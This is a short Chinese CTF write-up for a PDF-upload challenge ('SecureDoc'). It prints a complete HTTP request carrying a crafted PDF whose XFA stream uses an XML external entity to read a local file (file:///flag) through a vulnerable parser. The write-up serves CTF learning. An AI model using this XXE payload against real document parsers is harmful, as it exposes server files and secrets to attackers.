# SecureDoc
进去是文件上传的题，先fuzz了一下允许上传的文件，发现好像只有pdf，那应该不是传统文件上传rce。
随便上传一个pdf看到题目提示`No XFA content found in PDF. This parser specializes in XFA forms.`
![[file-20260125150811298.png]]
于是找到了XFA的解析漏洞：
https://www.cnblogs.com/clnchanpin/p/19474345
这里不知道是用什么解析的，但是都是解析漏洞，poc应该都差不多，所以这里可以用
文章的链接给的poc好像有点小问题，把文章中的xml替换上去就成功了。
poc:
```http
POST /upload HTTP/1.1
Host: 5000-69ea2ac2-b83e-4979-813a-f3dbfca0ad77.challenge.ctfplus.cn
Content-Length: 1636
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWGd0SmXmAipiUh8U
Accept: */*
Origin: http://5000-69ea2ac2-b83e-4979-813a-f3dbfca0ad77.challenge.ctfplus.cn
Referer: http://5000-69ea2ac2-b83e-4979-813a-f3dbfca0ad77.challenge.ctfplus.cn/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: _clck=110bj5k%5E2%5Eg30%5E0%5E2101
Connection: keep-alive

------WebKitFormBoundaryWGd0SmXmAipiUh8U
Content-Disposition: form-data; name="file"; filename="CVE-2025-66516-xfa-passwd.pdf"
Content-Type: application/pdf

%PDF-1.7
%âãÏÓ
1 0 obj
<< /Type /Catalog /Pages 2 0 R /AcroForm 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << >> >>
endobj
5 0 obj
<< /Length 486 >>
stream
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE xdp:xdp [
  <!ENTITY xxe SYSTEM "file:///flag">
    ]>
      <xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/" xml:lang="en">
        <config xmlns="http://www.xfa.org/schema/xci/3.1/">
      <present><pdf><version>1.7</version></pdf></present>
      </config>
        <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">
          <subform name="form1" layout="tb">
          <pageSet>
          <pageArea><contentArea/><medium stock="letter"/></pageArea>
        </pageSet>
        <subform>
            <field name="data">
          <ui><textEdit/></ui>
        <value><text>&xxe;</text></value>
        </field>
      </subform>
    </subform>
  </template>
    <xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
  <xfa:data><form1><data>&xxe;</data></form1></xfa:data>
  </xfa:datasets>
</xdp:xdp>

endstream
endobj
4 0 obj
<< /NeedAppearances true /Fields [] /XFA 5 0 R >>
endobj
xref
0 6
0000000000 65535 f 
0000000015 00000 n 
0000000080 00000 n 
0000000137 00000 n 
0000000225 00000 n 
0000000762 00000 n 
trailer
<< /Size 6 /Root 1 0 R >>
startxref
827
%%EOF

------WebKitFormBoundaryWGd0SmXmAipiUh8U--

```
然后访问`/preview/f4902791-aaee-4b83-875e-2a4f8d0195f0`
![[file-20260125151230158.png]]
